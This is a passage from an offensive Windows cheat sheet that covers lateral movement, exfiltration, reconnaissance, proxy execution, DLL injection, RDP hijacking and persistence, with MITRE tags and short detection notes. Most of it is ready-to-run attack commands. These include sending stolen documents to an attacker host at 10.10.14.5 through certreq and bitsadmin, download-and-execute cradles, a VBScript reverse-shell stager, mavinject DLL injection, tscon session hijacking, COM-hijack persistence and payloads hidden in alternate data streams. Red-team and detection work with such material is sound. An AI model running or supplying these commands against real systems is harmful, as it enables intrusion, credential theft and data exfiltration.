wmic /node:192.168.1.50 /user:administrator /password:Password123 ^
  process where name="beacon.exe" get ProcessId, Name, CommandLine

# Detection notes:
#  - wmic.exe with /node: flag and remote IP = near-certain lateral movement IOC
#  - Source host: Event ID 4648 (explicit credential logon)
#  - Target host: Event ID 4624 (Type 3 network logon) + Event ID 4688 (process creation)
#  - Sysmon Event ID 1: wmic.exe CommandLine contains /node:
```

### 7.2 Winrs — Remote Shell via WinRM

**Privilege required:** High (remote WinRM access)  
**MITRE:** T1021.006

WinRM (port 5985/5986) must be enabled on the target. Common in server environments and enabled by default on Server 2012+.

```bash
# === winrs — Windows Remote Shell ===
# Interactive shell (requires WinRM enabled on target):
winrs -r:http://192.168.1.50:5985 -u:administrator -p:Password123 cmd.exe

# Execute single command:
winrs -r:192.168.1.50 -u:CORP\administrator -p:Password123 "whoami && ipconfig /all"

# Execute beacon:
winrs -r:192.168.1.50 -u:administrator -p:Password123 "C:\Windows\Temp\beacon.exe"

# Check if WinRM is accessible:
winrs -r:192.168.1.50 -u:administrator -p:Password123 "hostname"

# Detection notes:
#  - Target host: Event ID 4624 Type 3 or Type 10 (network/remote interactive)
#  - WinRM traffic (port 5985 HTTP / 5986 HTTPS) in network logs
#  - Source host: Sysmon Event ID 3 (network connection) from winrs.exe
```

### 7.3 Net Use + Schtasks — File Copy and Execute

**Privilege required:** High (admin share access on target)  
**MITRE:** T1021.002, T1053.005

```bash
# === net use + schtasks — mount admin share, copy beacon, schedule execution ===
# Step 1: Mount admin share
net use \\192.168.1.50\ADMIN$ Password123 /user:CORP\administrator

# Step 2: Copy beacon to target
copy C:\Windows\Temp\beacon.exe \\192.168.1.50\ADMIN$\Temp\beacon.exe

# Step 3: Create scheduled task on remote host
schtasks /create /s 192.168.1.50 /u CORP\administrator /p Password123 ^
  /tn "Microsoft\Windows\Maintenance\Healthcheck" ^
  /tr "C:\Windows\Temp\beacon.exe" ^
  /sc ONCE /st 00:00 /f

# Step 4: Run immediately
schtasks /run /s 192.168.1.50 /u CORP\administrator /p Password123 ^
  /tn "Microsoft\Windows\Maintenance\Healthcheck"

# Step 5: Clean up task
schtasks /delete /s 192.168.1.50 /u CORP\administrator /p Password123 ^
  /tn "Microsoft\Windows\Maintenance\Healthcheck" /f

# Step 6: Disconnect share
net use \\192.168.1.50\ADMIN$ /delete

# Detection notes:
#  - Target: Event ID 5140 (network share accessed), Event ID 5145 (share object checked)
#  - Target: Event ID 4698 (scheduled task created), Event ID 4702 (task updated)
#  - Source: net.exe with remote UNC paths in CommandLine
```

### 7.4 SC.exe — Service-Based Lateral Movement

**Privilege required:** High (admin on remote target)  
**MITRE:** T1543.003, T1021

The classic PsExec pattern — copy binary to admin share, create service, execute:

```bash
# === sc.exe — create and start remote service (manual PsExec pattern) ===
# Step 1: Copy payload to target admin share (requires admin share access):
copy beacon.exe \\192.168.1.50\ADMIN$\beacon.exe

# Step 2: Create service on remote host:
sc \\192.168.1.50 create beacon binpath= "C:\Windows\beacon.exe" start= demand

# Step 3: Start service:
sc \\192.168.1.50 start beacon

# Step 4: Clean up (service may error on "binpath exits immediately" — expected):
sc \\192.168.1.50 delete beacon

# Detection notes:
#  - Target: Event ID 7045 (new service installed) — high fidelity
#  - Target: Event ID 4697 (service installed in security log)
#  - Binpath to non-standard path (C:\Windows\beacon.exe) is suspicious
```

---

## 8. Exfiltration

**MITRE:** T1048 — Exfiltration Over Alternative Protocol, T1041 — Exfiltration Over C2 Channel

> **Scenario:** You have collected sensitive documents (financial data, source code). DLP rules block direct uploads and block known file-sharing domains. You need to exfil using built-in Windows tools over HTTPS.

### 8.1 Certreq — HTTPS Exfiltration

**Privilege required:** Low  
**MITRE:** T1048.003

Certreq is a certificate enrollment tool that makes HTTPS POST requests — use it to upload arbitrary data to an attacker-controlled listener.

```bash
# === certreq — HTTPS POST exfiltration ===
# Compress and encode data first:
makecab C:\Users\victim\Documents\sensitive.xlsx C:\Windows\Temp\s.cab
certutil -encode C:\Windows\Temp\s.cab C:\Windows\Temp\s.b64

# POST to attacker server (running simple HTTPS listener):
certreq -Post -config https://10.10.14.5/submit C:\Windows\Temp\s.b64

# Attacker listener (Python):
# from http.server import HTTPServer, BaseHTTPRequestHandler
# class Handler(BaseHTTPRequestHandler):
#   def do_POST(self):
#     data = self.rfile.read(int(self.headers['Content-Length']))
#     open('recv.b64','wb').write(data)
#     self.send_response(200); self.end_headers()
# HTTPServer(('0.0.0.0', 443), Handler).serve_forever()

# Detection notes:
#  - certreq.exe making outbound HTTPS to non-PKI infrastructure
#  - Large POST bodies from certreq.exe are anomalous
#  - SSL inspection can catch content even over HTTPS
```

### 8.2 Makecab + Expand — Compress Before Exfil

**Privilege required:** Low  
**MITRE:** T1560.001

```bash
# === makecab — compress multiple files before exfil ===
# Compress single file:
makecab C:\Users\victim\Desktop\passwords.xlsx C:\Windows\Temp\p.cab

# Compress directory using a directive file:
echo .Set Cabinet=ON > C:\Windows\Temp\pack.ddf
echo .Set Compress=ON >> C:\Windows\Temp\pack.ddf
echo .Set MaxDiskSize=0 >> C:\Windows\Temp\pack.ddf
echo .Set CabinetNameTemplate=loot.cab >> C:\Windows\Temp\pack.ddf
echo .Set DestinationDir=C:\Windows\Temp >> C:\Windows\Temp\pack.ddf
echo C:\Users\victim\Documents\*.docx >> C:\Windows\Temp\pack.ddf
echo C:\Users\victim\Documents\*.xlsx >> C:\Windows\Temp\pack.ddf
makecab /f C:\Windows\Temp\pack.ddf

# Decompress on attacker (Linux):
# cabextract loot.cab

# Expand.exe (built-in) for decompression on Windows:
expand C:\Windows\Temp\loot.cab -F:* C:\Windows\Temp\extracted\

# Detection notes:
#  - makecab.exe operating on user document directories is anomalous
#  - Monitor for .cab creation in Temp or unusual directories
```

### 8.3 Bitsadmin — Background Upload

**Privilege required:** Low  
**MITRE:** T1197, T1048

```bash
# === bitsadmin — upload loot file via BITS ===
# Create upload job (HTTPS to attacker server):
bitsadmin /create exfiljob
bitsadmin /addfile exfiljob C:\Windows\Temp\loot.cab http://10.10.14.5:8080/upload/loot.cab
bitsadmin /resume exfiljob

# Monitor transfer:
bitsadmin /info exfiljob /verbose

# Clean up:
bitsadmin /complete exfiljob
bitsadmin /cancel exfiljob

# Detection notes:
#  - BITS jobs logged in: Microsoft-Windows-Bits-Client/Operational Event Log
#  - Event ID 59 (BITS): job created; Event ID 60: job transferred
#  - BITS uploads to external IPs are unusual — network monitoring detects easily
#  - BITS traffic blends into Windows Update traffic over HTTP/HTTPS
```

---

## 9. Reconnaissance / Discovery

**MITRE:** T1018 — Remote System Discovery, T1087 — Account Discovery, T1482 — Domain Trust Discovery

> **Scenario:** You have a foothold on a domain-joined workstation. PowerShell is blocked and BloodHound won't run without flagging EDR. You need to enumerate Active Directory, users, groups, and network topology using only built-in Windows commands.

### 9.1 Domain and Forest Enumeration

**Privilege required:** Low (domain user)  
**MITRE:** T1482, T1069.002

```bash
# === nltest — domain and trust enumeration ===
# Enumerate domain controllers:
nltest /dclist:corp.local

# Enumerate domain trusts:
nltest /domain_trusts /all_trusts

# Locate PDC:
nltest /dsgetdc:corp.local

# Get site information:
nltest /dsgetsite

# === net.exe — basic domain info ===
net domain                          # Current domain
net view /domain                    # List domains
net view /domain:corp.local         # List shares in domain
net group "Domain Admins" /domain   # Domain Admin members
net group "Enterprise Admins" /domain
net group "Domain Controllers" /domain
net user /domain                    # All domain users
net user john.doe /domain           # Details on specific user
net localgroup Administrators       # Local admin members

# === dsquery — Active Directory LDAP queries ===
# All DCs:
dsquery server -domain corp.local

# All domain admins:
dsquery group -name "Domain Admins" | dsget group -members -expand

# Find computers by OS:
dsquery computer -name * -limit 0 | dsget computer -desc -dn

# Users not requiring password:
dsquery user -name * | dsget user -nopassword -samid

# Find users with specific attributes:
dsquery * -filter "(&(objectClass=user)(adminCount=1))" -limit 0 -attr sAMAccountName

# === ldifde — export AD objects to LDIF ===
# Export all users to file (analyze offline):
ldifde -f C:\Windows\Temp\users.ldf -r "(objectClass=user)" -l "cn,sAMAccountName,memberOf,adminCount"

# Export all groups:
ldifde -f C:\Windows\Temp\groups.ldf -r "(objectClass=group)" -l "cn,member"

# Detection notes:
#  - net.exe, nltest.exe, dsquery.exe queries generate LDAP traffic on DC
#  - Burst of LDAP queries from a workstation = discovery phase indicator
#  - Event ID 4662: Directory Service access (if object auditing enabled on DC)
#  - dsquery.exe and ldifde.exe in CommandLine from workstations is anomalous
```

### 9.2 Network and Host Enumeration

**Privilege required:** Low  
**MITRE:** T1018, T1040, T1049

```bash
# === systeminfo — target host profiling ===
systeminfo                         # Full host details (OS, patches, memory, domain)
systeminfo | findstr /i "domain hotfix"  # Quick relevant fields

# === Network discovery ===
ipconfig /all                      # All interfaces, DNS, WINS
route print                        # Routing table — reveals network segments
arp -a                             # ARP cache — recently contacted hosts
netstat -ano                       # All connections with PIDs
netstat -r                         # Routing table (same as route print)

# === Active session and share enumeration ===
net session                        # Who is connected TO this host
net use                            # Mapped drives on this host
net share                          # Shares on this host
net view \\192.168.1.50            # Shares on a remote host
net view /cache:\\192.168.1.50     # Offline file cache

# === WMIC — powerful local and remote enumeration ===
# Running processes (detailed):
wmic process get Name, ProcessId, ParentProcessId, CommandLine

# Installed software:
wmic product get Name, Version, InstallDate

# Startup items:
wmic startup get Caption, Command, Location, User

# Active connections:
wmic path Win32_NetworkConnection get LocalName, RemoteName, Status

# Disk drives:
wmic diskdrive get Model, Size, MediaType

# === DNS enumeration ===
# Dump local DNS cache (shows recently visited hosts):
ipconfig /displaydns

# Attempt zone transfer (unlikely to work but worth trying):
nslookup
> set type=any
> ls -d corp.local > C:\Windows\Temp\zone.txt

# Enumerate hostnames:
for /l %i in (1,1,254) do @ping -n 1 -w 50 192.168.1.%i | findstr "Reply"

# === CSVDE — alternative to ldifde for CSV output ===
csvde -f C:\Windows\Temp\users.csv -r "(objectClass=user)" -l "sAMAccountName,displayName,mail,memberOf"

# Detection notes:
#  - Rapid sequential pings (host discovery) — IDS/IPS signature
#  - wmic process get with CommandLine flag enumerates all process arguments
#  - LDAP queries for all users (ldifde/csvde) generate significant DC load
#  - Net session, net share — no logging by default but detectable via network traffic
```

### 9.3 Credential and Password Reuse Discovery

**Privilege required:** Low  
**MITRE:** T1552, T1555

```bash
# === findstr — search for credentials in common locations ===
# Search for passwords in config files:
findstr /si "password" C:\*.txt C:\*.xml C:\*.ini C:\*.config
findstr /si "password" C:\Users\*.txt C:\Users\*.xml C:\Users\*.ini

# IIS web.config files:
findstr /si "connectionString\|password\|credential" C:\inetpub\*.config

# Search for API keys:
findstr /si "api_key\|apikey\|api-key\|token\|secret" C:\*.json C:\*.env

# === cmdkey — list stored credentials ===
cmdkey /list
# Shows saved Windows credentials (RDP, mapped drives, etc.)

# === reg.exe — dump stored credentials from registry ===
# AutoLogon credentials (if configured):
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultUserName

# VNC password (if installed):
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKCU\Software\TightVNC\Server" /v Password

# PuTTY stored sessions:
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Detection notes:
#  - findstr.exe sweeping user directories — file access events in audit logs
#  - reg.exe querying Winlogon for password values is a known credential IOC
#  - cmdkey /list generates no log entries — stealth-safe
```

---

## 10. Script Host Execution

**MITRE:** T1059.005 (VBScript), T1059.007 (JScript), T1218

> **Scenario:** PowerShell is locked down by Constrained Language Mode and AMSI catches your download cradles. The target has App-V installed. You need a signed Microsoft binary that runs VBScript or JScript without spawning powershell.exe.

### 10.1 wscript.exe / cscript.exe — VBScript and JScript

**Privilege required:** Low  
**MITRE:** T1059.005, T1059.007

Windows Script Host ships with every Windows version. `wscript.exe` runs scripts in a GUI context; `cscript.exe` runs in console mode. Both accept VBScript (`.vbs`) and JScript (`.js`) natively, and `.wsf` (Windows Script Files) that mix both languages in XML.

```bash
# === wscript.exe — VBScript execution ===
# Run a local VBScript payload:
wscript.exe C:\Users\Public\payload.vbs

# Force VBScript engine regardless of extension:
wscript.exe //E:VBScript //B //Nologo C:\Users\Public\update.txt

# Run from UNC path (no local file needed):
wscript.exe \\10.10.14.5\share\stage.vbs

# === cscript.exe — same engine, console output ===
cscript.exe //E:JScript //Nologo C:\Users\Public\stager.js
cscript.exe \\10.10.14.5\share\stage.js

# === .wsf (Windows Script File) — mixes VBS and JS, evades extension-based rules ===
# evil.wsf template:
# <?xml version="1.0" ?>
# <package>
#   <job id="main">
#     <script language="JScript">
#       var shell = new ActiveXObject("WScript.Shell");
#       shell.Run("C:\\Windows\\Temp\\beacon.exe", 0, false);
#     </script>
#   </job>
# </package>
wscript.exe evil.wsf

# Minimal VBScript reverse shell (no custom tools):
# Set sh = CreateObject("WScript.Shell")
# sh.Run "cmd.exe /c powershell -ep bypass -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/run.ps1')", 0, False

# Detection notes:
#  - wscript/cscript with //E: flag forcing engine is anomalous
#  - Parent process chain: Office/browser → wscript is a common phishing IOC
#  - UNC path execution leaves no local file artifact — network-only IOC
#  - AMSI intercepts decoded script content in modern Windows (19H1+)
#  - Sysmon Event ID 1: CommandLine containing //E:, .wsf, or UNC paths
```

### 10.2 SyncAppvPublishingServer — PowerShell Without powershell.exe

**Privilege required:** Low  
**MITRE:** T1218, T1059.001

Present on any system with App-V components. Internally invokes PowerShell via API — the process tree shows `SyncAppvPublishingServer.exe → powershell.exe`, which evades rules tuned for Office or scripts spawning PowerShell directly.

```bash
# === SyncAppvPublishingServer.exe — inline PowerShell execution ===
# The argument is parsed as App-V publishing input; semicolon terminates it,
# and the rest runs as PowerShell:
SyncAppvPublishingServer.exe "n;IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/run.ps1')"

# Download and execute:
SyncAppvPublishingServer.exe "n;(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5/b.exe','C:\Windows\Temp\b.exe');Start-Process 'C:\Windows\Temp\b.exe'"

# Simple command execution:
SyncAppvPublishingServer.exe "Break;Start-Process calc.exe"
SyncAppvPublishingServer.exe "n;whoami | Out-File C:\Windows\Temp\out.txt"

# .vbs variant (same binary family):
C:\Windows\System32\SyncAppvPublishingServer.vbs "n;IEX(...)"

# Detection notes:
#  - PowerShell child of SyncAppvPublishingServer is almost never legitimate
#  - Sysmon Event ID 1: parent image = SyncAppvPublishingServer
#  - Only present on App-V systems — validate before using
#  - ScriptBlock logging (Event 4104) still captures the PowerShell payload
```

---

## 11. .NET COM Registration Proxy Execution

**MITRE:** T1218.009 — System Binary Proxy Execution: Regsvcs/Regasm

> **Scenario:** AppLocker blocks your payload. The target has default AppLocker rules whitelisting all Microsoft-signed binaries under `C:\Windows\Microsoft.NET\`. You can register a malicious .NET assembly using signed Microsoft tools and execute code without spawning anything outside the allowed path.

### 11.1 regasm.exe — COM Registration Uninstall Hook

**Privilege required:** Low (standard user for `regasm /U`)  
**MITRE:** T1218.009

`regasm.exe` registers .NET assemblies as COM components. It executes code decorated with `[ComRegisterFunction]` / `[ComUnregisterFunction]` attributes — critically, the `/U` (unregister) flag triggers `ComUnregisterFunction` without requiring a prior registration or elevated rights.

```bash
# === regasm.exe — execute payload via ComUnregisterFunction ===
# Attacker-side: build evil.dll with payload in ComUnregisterFunction
# (C# snippet):
# [ComUnregisterFunction]
# public static void Unregister(Type t) {
#   // shellcode loader, reverse shell, etc.
#   System.Diagnostics.Process.Start("cmd.exe", "/c C:\\Windows\\Temp\\beacon.exe");
# }

# Execute (no admin required, /U flag):
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe /U C:\Users\Public\evil.dll

# Suppress output:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe /U /silent C:\Users\Public\evil.dll

# 32-bit version (for 32-bit payloads):
C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe /U C:\Users\Public\evil32.dll

# AppLocker bypass: regasm.exe lives in C:\Windows\Microsoft.NET\ — whitelisted
# by default Publisher and Path rules in most AppLocker deployments

# Detection notes:
#  - regasm.exe with /U flag against non-standard paths — high fidelity IOC
#  - Legitimate use: Visual Studio tooling only, not end-user machines
#  - Sysmon Event ID 7: unsigned DLL loaded by regasm.exe
#  - AMSI can inspect the assembly on load in modern .NET
```

### 11.2 regsvcs.exe — COM+ Application Registration

**Privilege required:** High (Administrator for COM+ registration)  
**MITRE:** T1218.009

```bash
# === regsvcs.exe — same ComRegisterFunction abuse ===
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegSvcs.exe evil.dll

# Like regasm, executes [ComRegisterFunction] and [ComUnregisterFunction]
# during registration/unregistration. Requires admin for the COM+ catalog write,
# but the code in the hooks fires before the privilege check fails.

# Detection notes:
#  - regsvcs.exe is virtually never invoked on end-user workstations
#  - Any regsvcs execution with non-Microsoft DLL path should alert
```

---

## 12. Signed DLL Injection — mavinject.exe

**MITRE:** T1055.001 (Process Injection: DLL Injection), T1218.013

> **Scenario:** You have a foothold running as SYSTEM after a service exploit. You want to inject a beacon DLL into a trusted long-lived process (explorer.exe, svchost.exe) using only a Microsoft-signed injector — avoiding custom tools that trigger EDR process-injection detections.

**Privilege required:** SeDebugPrivilege (SYSTEM or Administrator)  
**Binary:** `C:\Windows\System32\mavinject.exe` — Microsoft Application Virtualization Injector, ships on all modern Windows.

```bash
# === mavinject.exe — signed Microsoft DLL injector ===
# Step 1: Get PID of target process
tasklist | findstr "explorer.exe"
# Or: wmic process where name='explorer.exe' get ProcessId

# Step 2: Inject DLL into target process
# Replace 1234 with actual explorer.exe PID:
mavinject.exe 1234 /INJECTRUNNING C:\Users\Public\beacon.dll

# Inject into svchost (blends into service activity):
# Get a svchost PID that handles netsvcs:
tasklist /svc | findstr "netsvcs"
mavinject.exe 892 /INJECTRUNNING C:\Users\Public\beacon.dll

# How it works:
# mavinject.exe calls OpenProcess → VirtualAllocEx → WriteProcessMemory →
# CreateRemoteThread (LoadLibraryA) against the target PID.
# Because mavinject.exe is Microsoft-signed, the injection itself appears
# legitimate. EDR behavioral rules for CreateRemoteThread typically
# allowlist Microsoft-signed source processes.

# Known threat actor use: Lazarus Group, FIN7, Mustang Panda (Feb 2025)
# — all observed using mavinject for beacon injection

# Detection notes:
#  - Sysmon Event ID 8 (CreateRemoteThread): source = mavinject.exe — trivial to alert
#  - Very few orgs have this specific alert tuned despite the clear IOC
#  - Process access (Sysmon 10): mavinject.exe accessing explorer/svchost
#  - The DLL on disk still triggers AV scans — combine with ADS hiding (Section 15.2)
```

---

## 13. DCOM Lateral Movement

**MITRE:** T1021.003 — Remote Services: Distributed COM

> **Scenario:** WMI lateral movement (Section 7.1) is blocked by your EDR. You need an alternative to execute code on a remote host where the process spawn appears to originate from a legitimate signed application (mmc.exe, excel.exe) rather than wmiprvse.exe — which EDR rules target heavily.

**Privilege required:** Local Administrator on the remote target (DCOM launch/activation permissions)

### 13.1 MMC20.Application — Most Reliable DCOM Lateral Method

```bash
# === DCOM via MMC20.Application — spawns child from mmc.exe on target ===
# Using PowerShell (if available):
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.1.50"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c C:\Windows\Temp\beacon.exe","7")

# The "7" parameter = window style SW_SHOWMINNOACTIVE (hidden-ish)

# Execute with credentials:
$cred = New-Object System.Management.Automation.PSCredential("CORP\administrator", (ConvertTo-SecureString "Password123" -AsPlainText -Force))
# (DCOM doesn't use PSCredential directly — use runas or token impersonation first,
#  then invoke DCOM under that token context)

# Verify: on target, the spawn appears as: mmc.exe → cmd.exe → beacon.exe
# This evades rules looking for wmiprvse.exe as parent

# Detection notes:
#  - Target: Sysmon Event ID 1 — child process parent = mmc.exe is unusual
#  - RPC traffic on TCP 135 + dynamic ephemeral port from source to target
#  - Event ID 4624 (Type 3 logon) + Event ID 4648 on source/target
```

### 13.2 ShellWindows — DCOM via Explorer Shell

```bash
# === DCOM via ShellWindows — execution appears as child of explorer.exe ===
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","192.168.1.50"))
$item = $com.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c whoami > C:\Windows\Temp\out.txt","C:\Windows\System32",$null,0)

# ShellBrowserWindow variant (CLSID: C08AFD90-F2A1-11D1-8455-00A0C91F3880):
$com2 = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","192.168.1.50"))
$com2.Document.Application.ShellExecute("C:\Windows\Temp\beacon.exe",$null,"C:\Windows\Temp",$null,0)

# Detection notes:
#  - Process spawn parent = explorer.exe with no desktop session = suspicious
#  - DCOM authentication event (Security log) on target: source process = powershell/cmd
```

### 13.3 Excel.Application — DCOM via Office

```bash
# === DCOM via Excel (requires Office installed on target) ===
$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","192.168.1.50"))
$excel.DisplayAlerts = $false
$wb = $excel.Workbooks.Add()
$sheet = $excel.Sheets.Add([System.Reflection.Missing]::Value,[System.Reflection.Missing]::Value,1,-4167)
# -4167 = xlExcel4MacroSheet
$sheet.Cells.Item(1,1) = "=EXEC(""C:\Windows\Temp\beacon.exe"")"
$excel.ExecuteExcel4Macro("RUN(R1C1)")
$excel.Quit()

# Detection notes:
#  - Excel.Application spawning child process remotely via DCOM is high fidelity
#  - Office process spawning cmd/powershell: behavioral rule in most EDRs
#  - Requires Office installed on target — confirm before attempting
```

---

## 14. RDP Session Hijacking + Built-in SSH Lateral Movement

### 14.1 tscon.exe — RDP Session Hijacking Without Credentials

**Privilege required:** SYSTEM (no credentials needed — this is the key)  
**MITRE:** T1563.002 — Remote Service Session Hijacking: RDP Hijacking

When running as SYSTEM, `tscon.exe` transfers any terminal session to your session without re-authentication. Disconnected admin sessions on jump hosts are prime targets — domain admins often leave sessions when they close the RDP window without logging off.

> **Scenario:** You've escalated to SYSTEM on a Windows Server RDS jump box. `query user` shows a disconnected Domain Admin session from 2 hours ago. You hijack it silently — no credentials, no UAC prompt, and the session transfer doesn't generate a new logon event.

```bash
# === tscon.exe RDP session hijack (SYSTEM required) ===

# Step 1: Enumerate all sessions (including disconnected ones)
query user
# Or: quser
# Output example:
# USERNAME              SESSIONNAME        ID  STATE   IDLE TIME
# jsmith                rdp-tcp#0           2  Disc    2:14
# administrator         rdp-tcp#1           3  Active  0:00 (you)

# Step 2: Create a SYSTEM-context service that runs tscon to hijack session 2
# (The service executes tscon as SYSTEM — bypassing credential requirement)
sc create sesshijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#1"
net start sesshijack

# The disconnected session (ID 2) is now connected to your active RDP session (rdp-tcp#1)
# You inherit jsmith's full interactive session — all open apps, tokens, mapped drives

# Alternative — if you already have a SYSTEM shell via PsExec or token impersonation:
# (From SYSTEM shell directly)
tscon 2 /dest:rdp-tcp#1

# Step 3: Clean up the service after use
sc delete sesshijack

# Still works on: Windows Server 2022, Windows 11 (as of 2025) — 14 years and counting

# Detection notes:
#  - Event ID 4778 (session reconnect) WITHOUT preceding 4624 logon — abnormal pattern
#  - Event ID 4779 on original session (disconnect) immediately followed by 4778 on yours
#  - tscon.exe invoked by services.exe or via SC command outside normal RDP flow
#  - This does NOT generate a Type 10 logon event — evades logon-based detection
```

### 14.2 ssh.exe — Built-in SSH Lateral Movement and Tunneling

**Privilege required:** Low (standard user for outbound SSH)  
**MITRE:** T1021.004 (Remote Services: SSH), T1572 (Protocol Tunneling)  
**Available:** Windows 10 1803+ (`C:\Windows\System32\OpenSSH\ssh.exe`)

```bash
# === ssh.exe — built-in Microsoft OpenSSH client ===

# Basic lateral movement:
ssh.exe user@192.168.1.50 "whoami /all && ipconfig"
ssh.exe CORP\administrator@192.168.1.50 "cmd /c C:\Windows\Temp\beacon.exe"

# Key-based auth (no password prompt, cleaner opsec):
# Generate key pair on current host:
ssh-keygen.exe -t ed25519 -f C:\ProgramData\.ssh\id_ed25519 -N ""
# Copy public key to target's authorized_keys (if you have write access):
type C:\ProgramData\.ssh\id_ed25519.pub >> \\192.168.1.50\c$\Users\administrator\.ssh\authorized_keys

# Connect without host key prompt:
ssh.exe -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL -i C:\ProgramData\.ssh\id_ed25519 administrator@192.168.1.50

# === Tunneling / pivoting — highly valuable ===

# Local forward: attacker port 8080 → internal RDP (3389) via jump host
# (Access internal-host:3389 through attacker:8080)
ssh.exe -L 0.0.0.0:8080:internal-host:3389 -N user@jump.box

# Reverse tunnel: expose victim's localhost:445 on attacker port 4444
# (Reach SMB behind NAT via attacker's port 4444)
ssh.exe -R 0.0.0.0:4444:127.0.0.1:445 attacker@c2.domain -N

# Dynamic SOCKS5 proxy through jump host (pivot entire network):
ssh.exe -D 1080 -N user@jump.box
# Then use proxychains4 / SOCKS5 client to reach internal targets

# ProxyJump through multiple hops:
ssh.exe -J user@hop1,user@hop2 administrator@final-target

# Detection notes:
#  - OpenSSH event log: Microsoft-Windows-OpenSSH/Operational
#  - Outbound TCP 22 from workstations is rare in most enterprises — network alert
#  - ssh.exe with -R/-L/-D flags in CommandLine (Sysmon Event ID 1) indicates tunneling
#  - ssh.exe spawned by non-interactive process (scheduled task, service) is very suspicious
#  - Key files in non-standard paths (C:\ProgramData, Temp) are artifacts
```

---

## 15. Advanced Persistence Techniques

### 15.1 COM Object Hijacking — HKCU CLSID Persistence

**Privilege required:** Low (HKCU writes require no elevation)  
**MITRE:** T1546.015 — Event Triggered Execution: Component Object Model Hijacking

Windows COM resolution checks `HKCU\Software\Classes\CLSID` before `HKLM\Software\Classes\CLSID`. By planting a CLSID in HKCU pointing to a malicious DLL, any process that loads the target CLSID as the current user will load the attacker DLL instead.

> **Scenario:** You need user-level persistence without touching HKLM, startup folders, or scheduled tasks. COM hijacking via HKCU is invisible to most persistence hunters focused on Run keys and services.

```bash
# === COM hijacking — HKCU CLSID persistence ===

# Step 1: Find exploitable CLSIDs (HKLM-registered, no HKCU override, loaded by target process)
# Use Process Monitor on a test system: filter Image = explorer.exe,
# Path ends with CLSID, Result = NAME NOT FOUND → these are phantom CLSIDs

# High-value pre-identified CLSIDs (fire on explorer launch or frequent OS events):
# {42aedc87-2188-41fd-b9a3-0c966feabec1} — MruPidlList (explorer.exe, every logon)
# {AB8902B4-09CA-4bb6-B78D-A8F59079A8D5} — Thumbnail cache (frequent file browsing)
# {F6BF8414-962C-40FE-90F1-B80A7E72DB9A} — Scheduled Tasks shell extension

# Step 2: Register malicious DLL under HKCU (no admin needed)
reg add "HKCU\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" ^
  /ve /d "C:\Users\Public\evil.dll" /f

reg add "HKCU\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" ^
  /v "ThreadingModel" /d "Apartment" /f

# Step 3: Next time explorer.exe (or any process loading this CLSID) starts,
# evil.dll is loaded in that process context

# Enumerate your hijacks:
reg query "HKCU\Software\Classes\CLSID" /s

# Clean up:
reg delete "HKCU\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" /f

# Detection notes:
#  - Sysmon Event ID 13: registry write to HKCU\Software\Classes\CLSID\*\InprocServer32
#  - Sysmon Event ID 7: unsigned DLL loaded by explorer.exe from user-writable path
#  - Autoruns.exe: checks HKCU CLSID overrides — run it as standard user context
```

### 15.2 Alternate Data Streams (ADS) — Payload Hiding in NTFS

**Privilege required:** Low  
**MITRE:** T1564.004 — Hide Artifacts: NTFS File Attributes

NTFS supports multiple data streams per file. The default stream (`:$DATA`) is what `dir` shows. Additional named streams are invisible to `dir` but fully readable/executable. Payloads stored in ADS survive beside legitimate-looking files.

```bash
# === ADS — hide payload in a named stream of a legitimate file ===

# Write payload into ADS:
type C:\Windows\Temp\evil.exe > C:\Windows\Temp\readme.txt:update.exe
# Or download directly into ADS:
certutil.exe -urlcache -split -f http://10.10.14.5/b.b64 C:\Windows\Temp\readme.txt:b.b64

# Verify stream is hidden (normal dir won't show it):
dir C:\Windows\Temp\readme.txt        # shows only 0-byte (or original) file
dir /R C:\Windows\Temp\readme.txt     # /R reveals all streams

# === Execute payload from ADS ===

# VBScript / JScript from ADS (works on all Windows versions):
wscript.exe C:\Windows\Temp\readme.txt:stage.vbs
cscript.exe C:\Windows\Temp\readme.txt:stage.js

# DLL from ADS via rundll32:
rundll32.exe "C:\Windows\Temp\readme.txt:evil.dll",EntryPoint

# Read + execute via PowerShell:
Get-Content C:\Windows\Temp\readme.txt -Stream update | Invoke-Expression

# WMIC process from ADS:
wmic process call create "wscript.exe C:\Windows\Temp\readme.txt:stage.vbs"

# Note: Direct .exe execution from ADS is blocked on Windows 10+ (MotW/SRP)
# Use script hosts (wscript, cscript, rundll32) as execution proxies

# Detection notes:
#  - Sysmon Event ID 15 (FileCreateStreamHash): dedicated event for ADS creation
#  - Most orgs have Sysmon 15 disabled — check your config
#  - PowerShell: Get-Item C:\path\file.txt -Stream * enumerates all streams
#  - ADS is NTFS-only; copying to FAT32 or network share without ADS support loses the stream
```

### 15.3 DLL Search Order Hijacking

**Privilege required:** Low (for user-writable locations)  
**MITRE:** T1574.001 — Hijack Execution Flow: DLL Search Order Hijacking

Windows searches for DLLs in a specific order. Before checking `System32`, it checks the application directory and `%PATH%` entries. If a signed binary is copied to a user-writable directory and a malicious DLL with the expected name is placed beside it, the DLL is loaded from that directory first.

```bash
# === DLL search order hijacking ===

# Windows default DLL search order:
